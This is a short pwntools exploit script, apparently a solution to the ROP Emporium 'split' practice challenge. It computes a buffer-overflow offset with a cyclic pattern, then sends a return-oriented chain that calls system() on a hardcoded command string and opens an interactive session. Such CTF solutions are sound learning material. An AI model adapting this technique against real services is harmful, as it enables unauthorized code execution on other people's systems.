#!/usr/bin/env python3

from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def find_offset(payload):
    proc = start()
    proc.sendlineafter(b'>', payload)
    proc.wait()
    ip_offset = cyclic_find(proc.corefile.read(proc.corefile.sp, 4))
    return ip_offset

# basic setup
exe = './split'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'error'

# crafting payload
offset = find_offset(cyclic(100))
info(f'Offset is: {offset}')
payload = flat({ offset: [0x00000000004007c3, 0x601060, 0x000000000040074b] })
write('payload', payload)
info(f'Payload: {payload}')

# executing exploit
io = start()
io.sendlineafter(b'>', payload)
io.interactive()
